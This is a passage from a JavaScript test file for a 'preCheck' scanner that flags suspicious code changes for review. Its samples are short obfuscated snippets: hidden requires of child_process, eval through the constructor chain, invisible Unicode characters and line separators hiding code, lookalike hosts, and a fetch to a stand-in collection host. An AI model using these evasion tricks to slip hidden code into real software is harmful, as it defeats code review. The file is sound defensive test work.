      ['const f = Reflect.construct(Function, [code]);'],
    ],
    [
      's040',
      'computed constructor chain',
      'src/models/sample.js',
      '100644',
      ["const f = []['constructor']['constructor'](code);"],
    ],
    [
      's041',
      'constructor chain with dots (control)',
      'src/models/sample.js',
      '100644',
      ['const f = [].constructor.constructor(code);'],
    ],
    [
      's042',
      'setTimeout with a string variable',
      'src/models/sample.js',
      '100644',
      ['setTimeout(code, 0);'],
    ],
    [
      's043',
      'script element',
      'src/models/sample.js',
      '100644',
      [
        "const s = document.createElement('script'); s.text = code; document.head.append(s);",
      ],
    ],
    [
      's044',
      'Worker from a blob',
      'src/models/sample.js',
      '100644',
      ['new Worker(URL.createObjectURL(new Blob([code])));'],
    ],
    [
      's045',
      'vm through a computed require',
      'src/models/sample.test.js',
      '100644',
      ["const v = require('v' + 'm');"],
    ],
    [
      's046',
      'dynamic import of a variable (control)',
      'src/models/sample.js',
      '100644',
      ['const m = await import(name);'],
    ],
    [
      's047',
      'dynamic import of a literal path',
      'src/models/sample.js',
      '100644',
      ["const m = await import('../../scripts/baseline.js');"],
    ],
    [
      's048',
      'dynamic import with a comment first',
      'src/models/sample.js',
      '100644',
      ["const m = await import(/* x */ 'fs');"],
    ],
    [
      's049',
      'unicode escape in a string (control)',
      'src/models/sample.test.js',
      '100644',
      ["const m = require('child\\u005fprocess');"],
    ],
    [
      's050',
      'hex escape in a string (control)',
      'src/models/sample.test.js',
      '100644',
      ["const m = require('child\\x5fprocess');"],
    ],
    [
      's051',
      'octal escape in a string',
      'src/models/sample.test.js',
      '100644',
      ["const m = require('child\\137process');"],
    ],
    [
      's052',
      'percent encoding',
      'src/models/sample.test.js',
      '100644',
      ["const m = require(decodeURIComponent('%66%73'));"],
    ],
    [
      's053',
      'unescape',
      'src/models/sample.test.js',
      '100644',
      ["const m = require(unescape('%66s'));"],
    ],
    [
      's054',
      'reversed string',
      'src/models/sample.test.js',
      '100644',
      ["const m = require('ssecorp_dlihc'.split('').reverse().join(''));"],
    ],
    [
      's055',
      'TextDecoder on bytes',
      'src/models/sample.test.js',
      '100644',
      ['const n = new TextDecoder().decode(new Uint8Array([102, 115]));'],
    ],
    [
      's057',
      'atob (control)',
      'src/models/sample.test.js',
      '100644',
      ["const n = atob('ZnM=');"],
    ],
    [
      's058',
      'short base64 with a custom decoder',
      'src/models/sample.test.js',
      '100644',
      ["const n = decode('Y2hpbGRfcHJvY2Vzcw');"],
    ],
    [
      's059',
      'unicode escape in an identifier',
      'src/models/sample.js',
      '100644',
      ['const e = proc\\u0065ss.env;'],
    ],
    [
      's060',
      'zero width space (control)',
      'src/models/sample.js',
      '100644',
      ['const a\u200b = 1;'],
    ],
    [
      's061',
      'bidi override (control)',
      'src/models/sample.js',
      '100644',
      ["const a = 'x\u202e';"],
    ],
    [
      's062',
      'Hangul filler as an identifier',
      'src/models/sample.js',
      '100644',
      ['const { a, \u3164 } = q;'],
    ],
    [
      's063',
      'word joiner U+2060',
      'src/models/sample.js',
      '100644',
      ["const a = 'x\u2060';"],
    ],
    [
      's064',
      'soft hyphen U+00AD',
      'src/models/sample.js',
      '100644',
      ["const a = 'x\u00ad';"],
    ],
    [
      's065',
      'variation selector U+FE0F',
      'src/models/sample.js',
      '100644',
      ["const a = 'x\ufe0f\ufe0e';"],
    ],
    [
      's066',
      'tag characters U+E0061',
      'src/models/sample.js',
      '100644',
      ["const a = 'x\udb40\udc61\udb40\udc62';"],
    ],
    [
      's067',
      'private use character U+E000',
      'src/models/sample.js',
      '100644',
      ["const a = 'x\ue000';"],
    ],
    [
      's068',
      'Arabic letter mark U+061C',
      'src/models/sample.js',
      '100644',
      ["const a = 'x\u061c';"],
    ],
    [
      's069',
      'no-break space U+00A0',
      'src/models/sample.js',
      '100644',
      ['const\u00a0a = 1;'],
    ],
    [
      's070',
      'Cyrillic letter in an identifier',
      'src/models/sample.js',
      '100644',
      ['const \u0430 = require;'],
    ],
    [
      's071',
      'Cyrillic letter in a known host',
      'src/models/sample.js',
      '100644',
      ["const u = 'https://treetracker.\u043erg/x';"],
    ],
    [
      's072',
      'line separator U+2028 hides code',
      'src/models/sample.js',
      '100644',
      ["const a = 1;\u2028fetch('http://collect.example.net');"],
    ],
    [
      's073',
      'paragraph separator U+2029 hides code',
      'src/models/sample.js',
      '100644',
      ["// note\u2029require('child_process');"],
    ],
    [
      's074',
      'lone CR hides code',
      'src/models/sample.js',
      '100644',
      ["// note\rrequire('child_process');"],
    ],
    [
      's075',
      'form feed hides code',
      'src/models/sample.js',
      '100644',
      ["const a = 1;\frequire('child_process');"],
    ],
    [
      's076',
      'vertical tab hides code',
      'src/models/sample.js',
      '100644',
      ["const a = 1;\u000brequire('child_process');"],
    ],
    [
      's077',
      'NEL U+0085 hides text',
      'src/models/sample.js',
      '100644',
      ["const a = 1;\u0085require('child_process');"],
    ],
    [
      's078',
      'unknown host (control)',
      'src/models/sample.js',
      '100644',
      ["const u = 'https://collect.example.net/x';"],
    ],
    [
      's079',
      'known host as userinfo',
      'src/models/sample.js',
      '100644',
      ["const u = 'https://treetracker.org@collect.example.net/x';"],
    ],
    [
      's080',
      'known host as a prefix label (control)',
      'src/models/sample.js',
      '100644',
      ["const u = 'https://treetracker.org.example.net/x';"],
    ],
    [
      's081',
      'protocol-relative URL',
      'src/models/sample.js',
      '100644',
      ["const u = '//collect.example.net/x';"],
    ],
    [
      's082',
      'scheme from 2 strings',
      'src/models/sample.js',
      '100644',
      ["const u = 'ht' + 'tps:/' + '/collect.example.net/x';"],
    ],
    [
      's083',
      'IPv6 literal',
      'src/models/sample.js',
      '100644',
      ["const u = 'http://[2001:db8::1]/x';"],
    ],
    [
      's084',
      'decimal IP address (control)',
      'src/models/sample.js',
      '100644',
      ["const u = 'http://3232235777/x';"],
    ],
    [
      's085',
      'websocket scheme',
      'src/models/sample.js',
      '100644',
      ["const u = 'wss://collect.example.net/x';"],
    ],
    [
      's088',
      'ESLint config in a subfolder (JS)',
      'src/.eslintrc.js',
      '100644',
      ['module.exports = { rules: {} };'],
    ],
    [
      's089',
      'ESLint config in a subfolder (JSON)',
      'cypress/tests/.eslintrc.json',
      '100644',
      ['{ "root": true, "rules": {} }'],
    ],
    [
      's090',
      'Babel config in a subfolder',
      'src/.babelrc.js',
      '100644',
      ["module.exports = { plugins: ['./models/sample.js'] };"],
    ],
    [
      's091',
      'nested package.json',
      'src/package.json',
      '100644',
      ['{ "type": "commonjs", "main": "models/sample.js" }'],
    ],
    [
      's092',
      'Jest snapshot file',
      'src/models/__snapshots__/sample.test.js.snap',
      '100644',
      ["exports[`a 1`] = `x`; const p = process; p['ex' + 'it'](0);"],
    ],
    [
      's093',
      'JS fixture for cy.fixture',
      'cypress/fixtures/sample.js',
      '100644',
      ['({ a: this.constructor })'],
    ],
    [
      's094',
      'server code of a page',
      'src/pages/api/sample.js',
      '100644',
      [
        "export default function handler(req, res) { res.end(String(require('o' + 's').hostname())); }",
      ],
    ],
    [
      's095',
      'SVG with a script',
      'public/sample.svg',
      '100644',
      [
        '<svg xmlns="http://www.w3.org/2000/svg"><script>top.x()</script></svg>',
      ],
    ],
    [
      's096',
      'HTML page in public',
      'public/sample.html',
      '100644',
      ['<script src=//collect.example.net/a.js></script>'],
    ],
    [
      's097',
      'git submodule entry',
      '',
      '160000',
      ['Subproject commit 0123456789abcdef0123456789abcdef01234567'],
    ],
    [
      's098',
      'JSON fixture with code text',
      'cypress/fixtures/sample.json',
      '100644',
      ['{ "name": "x", "then": "require(`fs`)" }'],
    ],
  ];

  it.each(SAMPLES)('gives REVIEW for %s: %s', (id, name, file, mode, lines) => {
    const result = preCheck(newFile(file, lines, { mode }));
    expect(result.verdict).toBe('review');
    expect(formatReport(result)).not.toContain('no reason sentence');
  });
});

describe('preCheck', () => {
  it('gives CLEAN for a small change in a usual folder', () => {
    const result = preCheck(newFile(SOURCE, ['export const size = 4;']));
    expect(result.verdict).toBe('clean');
    expect(result.findings).toEqual([]);
  });

  it('reports a global name that the check does not allow', () => {
    const result = preCheck(
      newFile(SOURCE, ['const a = 1;', "const m = require('child_process');"]),
    );
    expect(result.verdict).toBe('review');
    expect(result.findings).toContainEqual(
      expect.objectContaining({
        rule: 'global name that the check does not allow',
        detail: 'require',
        file: SOURCE,
        line: 2,
      }),
    );
  });
});
